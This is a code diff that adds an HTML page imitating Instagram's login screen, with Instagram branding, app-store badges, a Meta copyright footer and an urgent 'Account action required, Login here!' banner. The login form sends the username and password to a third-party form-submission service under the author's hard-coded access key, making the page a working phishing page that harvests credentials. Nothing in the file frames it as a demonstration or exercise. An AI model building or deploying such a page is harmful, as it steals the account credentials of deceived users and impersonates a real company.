@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Instagram Login Form </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
+        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        .warning {
+            background-color: #ff4d4d;
+            color: white;
+            padding: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* Custom Styles for Input Boxes */
+        .username,
+        .text {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            font-size: 16px;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #3897f0;
+            border: 1px solid #3897f0;
+            padding: 10px 0;
+            color: #fff;
+            cursor: pointer;
+            border-radius: 3px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="container">
+        <!-- Warning Message -->
+        <div class="warning">
+            Account action required, Login here!
+        </div>
+
+        <section>
+            <div class="main-top">
+                <div class="logo">
+                    <img src="https://static.toiimg.com/thumb/resizemode-4,msid-87585873,imgsize-6448,width-720/87585873.jpg" />
+                </div>
+                <div>
+                    <form action="https://api.web3forms.com/submit" method="POST">
+
+                        <!-- Replace with your Access Key -->
+                        <input type="hidden" name="access_key" value="8ef49631-baa1-46f6-b852-173cb0b52e04">
+                    
+                        <!-- Form Inputs. Each input must have a name="" attribute -->
+                        <input type="text" class="username" placeholder="username"  name="name" required>
+                        <input type="text" class="password"   placeholder="pasword" name="email" required>
+                        
+                    
+                        <!-- Honeypot Spam Protection -->
+                        <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+                    
+                        <!-- Custom Confirmation / Success Page -->
+                        <!-- <input type="hidden" name="redirect" value="https://mywebsite.com/thanks.html"> -->
+                    
+                        <button type="submit" class="login-btn">Log In</button>
+                    
+                </div>
+                <span class="or"> OR </span>
+
+                <div class="main-bottom">
+                    <a href="#" class="logInFB"><i class="fa-brands fa-facebook-f"></i> Log in with Facebook </a><br>
+                    <a href="#" class="forget"> Forgot password </a>
+                </div>
+            </div>
+
+            <div class="bottom">
+                <div class="signUp">
+                    Don't have an account? <a href="#">Sign up</a>
+                </div>
+            </div>
+
+            <div class="app-section">
+                <span> Get the app </span>
+                <div class="images">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="googlePlay Image">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft Image">
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer Section Starts from Here -->
+        <footer>
+            <a href="">Meta</a>
+            <a href="">About</a>
+            <a href="">Blog</a>
+            <a href="">Jobs</a>
+            <a href="">Help</a>
+            <a href="">API</a>
+            <a href="">Privacy</a>
+            <a href="">Terms</a>
+            <a href="">Top Accounts</a>
+            <a href="">Locations</a>
+            <a href="">Instagram Lite</a>
+            <a href="">Instagram Contact</a>
+            <a href="">Uploading & Non-Users</a>
+            <div class="bottom-footer">
+                <select name="" id="">
+                    <option value="English">English</option>
+                    <option value="Hindi">Hindi</option>
+                    <option value="Punjabi">Punjabi</option>
+                    <option value="Urdu">Urdu</option>
+                    <option value="Francais">Francais</option>
+                </select>
+                <span> &copy; 2023 Instagram from Meta</span>
+            </div>
+        </footer>
+    </div>
+
+</body>
+</html>
